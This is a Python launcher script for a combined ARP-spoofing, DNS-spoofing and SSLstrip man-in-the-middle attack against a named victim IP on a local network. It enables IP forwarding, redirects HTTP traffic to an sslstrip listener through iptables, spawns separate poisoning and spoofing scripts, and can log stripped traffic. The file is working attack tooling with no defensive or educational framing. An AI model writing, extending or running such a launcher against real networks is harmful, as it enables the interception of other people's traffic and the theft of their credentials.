import subprocess
import argparse
import os
import signal
import sys


# --- Utility Functions ---
def setup_attack_env():
    print("+++ Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    print("+++ Setting up iptables for SSLstrip redirection...")
    # Redirect HTTP traffic (port 80) to the port sslstrip listens on (8080)
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")


def cleanup():
    print("\n* Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    print("* Flushing iptables rules...")
    os.system("iptables -t nat -F")

    print("+++ All cleaned up. Exiting.")


# --- Main Logic ---
def main():
    # (Parser code remains the same as you had before)
    parser = argparse.ArgumentParser(description="Combined ARP + DNS + SSLstrip MITM Launcher")
    # ... (all your argparse arguments)
    parser.add_argument("--iface", required=True, help="Network interface (e.g. eth0)")
    parser.add_argument("--victim", required=True, help="Victim IP")
    parser.add_argument("--gateway", required=True, help="Gateway IP")
    parser.add_argument("--arp-mode", choices=["silent", "aggressive", "custom"], default="custom")
    parser.add_argument("--arp-sleep", type=float, default=2.0)
    parser.add_argument("--target-domains", nargs="+", required=True, help="Domains to spoof")
    parser.add_argument("--spoof-ip", required=True, help="Fake IP to send in DNS replies")
    parser.add_argument("--dns-mode", choices=["silent", "aggressive"], default="silent")
    parser.add_argument("--log", help="Optional log file for sslstrip")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("! You must run this script as root.")
        sys.exit(1)

    # Setup environment
    setup_attack_env()

    # Define processes to be launched
    processes = []
    try:
        # === Start ARP Spoofing ===
        print("* Launching ARP spoofing...")
        arp_cmd = [
            "python", "arp_poisoning.py",  # Use python 2.7 as you did
            "--victims", args.victim,
            "--gateway", args.gateway,
            "--iface", args.iface,
            "--mode", args.arp_mode,
            "--sleep", str(args.arp_sleep)
        ]
        processes.append(subprocess.Popen(arp_cmd))

        # === Start DNS Spoofing ===
        print("* Launching DNS spoofing...")
        dns_cmd = [
                      "python", "dns_spoofing.py",  # Use python 2.7
                      "--iface", args.iface,
                      "--target-domains",
                  ] + args.target_domains + [
                      "--spoof-ip", args.spoof_ip,
                      "--mode", args.dns_mode
                  ]
        processes.append(subprocess.Popen(dns_cmd))

        # === Start SSLstrip Runner ===
        print("* Launching SSLstrip...")
        # Use our new, simplified runner script
        ssl_cmd = ["python", "ssl_strip_runner.py"]
        if args.log:
            ssl_cmd.extend(["--log", args.log])
        processes.append(subprocess.Popen(ssl_cmd))

        print("\n* All components running. Press Ctrl+C to stop.")

        # Waits for user interrupt
        signal.pause()

    except KeyboardInterrupt:
        print("\n! Caught interrupt. Stopping all components...")
    finally:
        for p in processes:
            p.terminate()
        cleanup()
        sys.exit(0)


if __name__ == "__main__":
    main()